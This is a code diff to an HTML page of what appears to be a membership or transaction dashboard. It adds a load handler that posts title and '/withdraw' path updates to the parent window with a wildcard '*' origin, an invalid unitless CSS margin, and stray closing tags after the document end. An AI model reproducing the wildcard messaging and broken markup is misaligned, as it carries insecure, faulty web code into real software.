@@ -511,6 +511,7 @@ ANIMATION (MOVING LIGHT AROUND RING)
             padding: 20px;
             position: relative;
             z-index: 1;
+margin-bottom: 30;
         }
 
         .transaction-card {
@@ -1331,7 +1332,29 @@ ANIMATION (MOVING LIGHT AROUND RING)
                 window.location.href = "https://membership.avalonflow.site/dashboard";
             });
         }
+window.addEventListener("load", () => {
+    // Fire this only when the login form is fully rendered
+    window.parent.postMessage({
+        type: "UPDATE_TITLE",
+        title: "Transaction Review" 
+    }, "*");
+
+// 1. Grab the user context from the current URL right away
+const urlParams = new URLSearchParams(window.location.search);
+const userParam = urlParams.get('user');
+
+// 2. Build the destination path dynamically
+
+const destinationPath = userParam 
+    ? `/withdraw?user=${encodeURIComponent(userParam)}` 
+    : '/withdraw';
+
+// 3. Trigger your existing update mechanism with the updated path
+window.parent.postMessage({ type: "UPDATE_URL", path: destinationPath }, "*");
+});
 </script>
 </body>
 </html>
-
+--></div>
+</body>
+</html>
